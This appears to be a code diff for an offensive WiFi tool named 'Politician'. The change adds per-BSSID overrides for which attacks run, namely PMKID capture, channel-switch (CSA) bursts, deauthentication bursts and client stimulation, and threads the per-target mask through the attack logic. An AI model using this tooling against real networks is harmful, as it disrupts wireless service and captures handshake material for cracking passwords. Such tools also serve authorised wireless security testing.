@@ -52,8 +52,9 @@ Politician::Politician()
       _capturedCount(0)
 {
     _instance = this;
-    memset(&_stats,      0, sizeof(_stats));
-    memset(_sessions,    0, sizeof(_sessions));
+    memset(&_stats,           0, sizeof(_stats));
+    memset(_attackOverrides,  0, sizeof(_attackOverrides));
+    memset(_sessions,         0, sizeof(_sessions));
     memset(_apCache,     0, sizeof(_apCache));
     memset(_captured,    0, sizeof(_captured));
     memset(_targetBssid, 0, sizeof(_targetBssid));
@@ -201,6 +202,34 @@ void Politician::setAttackMask(uint8_t mask) {
     _attackMask = mask;
     _log("[WiFi] Attack mask: PMKID=%d CSA=%d PASSIVE=%d\n",
         !!(mask & ATTACK_PMKID), !!(mask & ATTACK_CSA), !!(mask & ATTACK_PASSIVE));
+}
+
+void Politician::setAttackMaskForBssid(const uint8_t *bssid, uint8_t mask) {
+    for (int i = 0; i < MAX_ATTACK_OVERRIDES; i++) {
+        if (_attackOverrides[i].active && memcmp(_attackOverrides[i].bssid, bssid, 6) == 0) {
+            _attackOverrides[i].mask = mask; return;
+        }
+    }
+    for (int i = 0; i < MAX_ATTACK_OVERRIDES; i++) {
+        if (!_attackOverrides[i].active) {
+            _attackOverrides[i].active = true;
+            memcpy(_attackOverrides[i].bssid, bssid, 6);
+            _attackOverrides[i].mask = mask; return;
+        }
+    }
+    _log("[Attack] Override table full — ignoring per-BSSID mask request\n");
+}
+
+void Politician::clearAttackMaskOverrides() {
+    memset(_attackOverrides, 0, sizeof(_attackOverrides));
+}
+
+uint8_t Politician::_getAttackMask(const uint8_t *bssid) const {
+    for (int i = 0; i < MAX_ATTACK_OVERRIDES; i++) {
+        if (_attackOverrides[i].active && memcmp(_attackOverrides[i].bssid, bssid, 6) == 0)
+            return _attackOverrides[i].mask;
+    }
+    return _attackMask;
 }
 
 // ─── Target mode ──────────────────────────────────────────────────────────────
@@ -555,6 +584,8 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
         // Execute targeting filter
         if (_filterCb && !_filterCb(ap)) return;
 
+        uint8_t effMask = _getAttackMask(ap.bssid);
+
         bool is_wpa3_only = (ap.enc >= 3) && _detectWpa3Only(ie, ie_len);
         bool pmf_capable = false, pmf_required = false;
         if (ap.enc >= 3) _detectPmfFlags(ie, ie_len, pmf_capable, pmf_required);
@@ -593,7 +624,7 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
             if (_hasTarget && memcmp(_targetBssid, ap.bssid, 6) != 0) return;
 
             // --- CLIENT WAKE-UP STIMULATION ---
-            if (((hdr->frame_ctrl & FC_SUBTYPE_MASK) == MGMT_SUB_BEACON) && (_attackMask & ATTACK_STIMULATE)) {
+            if (((hdr->frame_ctrl & FC_SUBTYPE_MASK) == MGMT_SUB_BEACON) && (effMask & ATTACK_STIMULATE)) {
                 for (int i = 0; i < MAX_AP_CACHE; i++) {
                     if (_apCache[i].active && memcmp(_apCache[i].bssid, ap.bssid, 6) == 0) {
                         if (!_apCache[i].has_active_clients && (millis() - _apCache[i].last_stimulate_ms > 15000)) {
@@ -622,7 +653,7 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
         if (_hasTarget) canFish = canFish && memcmp(ap.bssid, _targetBssid, 6) == 0;
 
         if (canFish && _fishState == FISH_IDLE) {
-            if (_attackMask & ATTACK_PMKID) {
+            if (effMask & ATTACK_PMKID) {
                 for (int i = 0; i < MAX_AP_CACHE; i++) {
                     if (!_apCache[i].active) continue;
                     if (memcmp(_apCache[i].bssid, ap.bssid, 6) != 0) continue;
@@ -641,7 +672,7 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
                     }
                     break;
                 }
-            } else if (_attackMask & (ATTACK_CSA | ATTACK_DEAUTH)) {
+            } else if (effMask & (ATTACK_CSA | ATTACK_DEAUTH)) {
                 // Immunity check applies regardless of which attack method is active
                 for (int i = 0; i < MAX_AP_CACHE; i++) {
                     if (_apCache[i].active && memcmp(_apCache[i].bssid, ap.bssid, 6) == 0) {
@@ -669,9 +700,9 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
                 _fishSsidLen = ap.ssid_len; _fishChannel = beacon_ch; _fishStartMs = millis();
                 _fishState = FISH_CSA_WAIT;
                 _csaSecondBurstSent = false;
-                if (_attackMask & ATTACK_CSA) _sendCsaBurst();
+                if (effMask & ATTACK_CSA) _sendCsaBurst();
                 const uint8_t *known_sta = (_fishSta[0] || _fishSta[1] || _fishSta[2]) ? _fishSta : nullptr;
-                if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst((_attackMask & ATTACK_CSA) ? _cfg.csa_deauth_count : _cfg.deauth_burst_count, known_sta);
+                if (effMask & ATTACK_DEAUTH) _sendDeauthBurst((effMask & ATTACK_CSA) ? _cfg.csa_deauth_count : _cfg.deauth_burst_count, known_sta);
                 _probeLocked = true; _probeLockEndMs = millis() + _cfg.csa_wait_ms;
                 _log("[Attack] Starting CSA/Deauth on %02X:%02X:%02X:%02X:%02X:%02X SSID=%.*s ch%d\n",
                     ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5], ap.ssid_len, ap.ssid, beacon_ch);
